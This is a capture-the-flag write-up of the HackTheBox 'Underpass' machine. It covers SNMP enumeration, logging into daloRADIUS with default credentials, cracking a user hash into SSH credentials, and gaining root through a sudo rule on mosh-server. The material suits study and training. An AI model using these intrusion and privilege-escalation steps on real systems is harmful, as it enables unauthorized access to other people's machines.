---
title: Underpass
tags:
  - HackTheBox
  - Easy
  - Linux
  - SNMP
  - DaloRadius
  - Brute-Forcing
  - Sudo-Vulnerability
  - Mosh
date: 2025-01-29T00:00:00Z
---
![](Pasted%20image%2020250129164341.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.48 underpass.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- underpass.htb > sC.txt

[redacted]
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
80/tcp open  http
|_http-title: Apache2 Ubuntu Default Page: It works
```

So I visited its website:

![](Pasted%20image%2020250129164524.png)

Apache2 Defalt page is found. After a lot of web reconnaissance with some tools, I didn't find anything, so I decided to repeat the Nmap scan but trying UDP instead TCP:

```shell
nmap -sU -T4 -top-ports 100 underpass.htb > sU.txt

[redacted]
PORT    STATE SERVICE
161/udp open  snmp
```

So inspecting  [Hacktricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/index.html#ports) i discovered the tool **snmpwalk** to perform ome information gathering on port 161:

```shell
snmpbulkwalk -c public -v2c underpass.htb

[redacted]
iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (140447) 0:23:24.47
iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"
```

I noticed a weird server called "*daloradius server*". No idea of what is it so I'll inspect it

## Weaponization

![](Pasted%20image%2020250129170801.png)

As they say:

> [!Info]
> *daloRADIUS is an advanced RADIUS web platform aimed at managing Hotspots and general-purpose ISP deployments.*

## Exploitation

So I discovered after searching info about it a login panel inside `http://underpass.htb/daloradius/app/operators/login.php`:

![](Pasted%20image%2020250129171456.png)

Now that I know the version (2.2 beta) I searched for "*daloradius default creds*" and got `administrator:radius`, which worked!

![](Pasted%20image%2020250129172546.png)

I noticed the "users" section and inspecting it I found an "easy-to-crack-seemed" hash:

![](Pasted%20image%2020250129172825.png)

> So I used [crackstation](https://crackstation.net/) to crack the hash and got some credentials :D `svcMosh:underwaterfriends`

### User flag

I'll login via SSH with previous creds.

> Got user flag :D

![](Pasted%20image%2020250129173232.png)

## Privilege Escalation

If I run `sudo -l`:

```shell
sudo -l

[redacted]
User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```

I executed the binary to check what it did:

```shell
sudo -u root /usr/bin/mosh-server


MOSH CONNECT 60001 oCZttNhfFwWfzzZTxKgkSg

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 1759]
```

It seems to be using **mosh 1.3.2**.

I did a quick search about what it was and got [mosh's official github page](https://github.com/mobile-shell/mosh)

> [!Info]
> *Mosh is a remote terminal application that supports intermittent connectivity, allows roaming, and provides speculative local echo and line editing of user keystrokes.*

>[!Info]
>**How it works**
  *The `mosh` program will SSH to `user@host` to establish the connection. SSH may prompt the user for a password or use public-key authentication to log in.
  From this point, `mosh` runs the `mosh-server` process (as the user) on the server machine. The server process listens on a high UDP port and sends its port number and an AES-128 secret key back to the client over SSH. The SSH connection is then shut down and the terminal session begins over UDP.
  If the client changes IP addresses, the server will begin sending to the client on the new IP address within a few seconds.
  To function, Mosh requires UDP datagrams to be passed between client and server. By default, `mosh` uses a port number between 60000 and 61000, but the user can select a particular port with the -p option. Please note that the -p option has no effect on the port used by SSH.*

After inspecting how it worked, I did the following:

```shell
sudo -u root /usr/bin/mosh-server new

MOSH_KEY=oCZttNhfFwWfzzZTxKgkSg /usr/bin/mosh-client localhost 60001
```

### Root flag

> Now I'm root and can read root flag :D

![](Pasted%20image%2020250129175301.png)

==Machine pwned!==




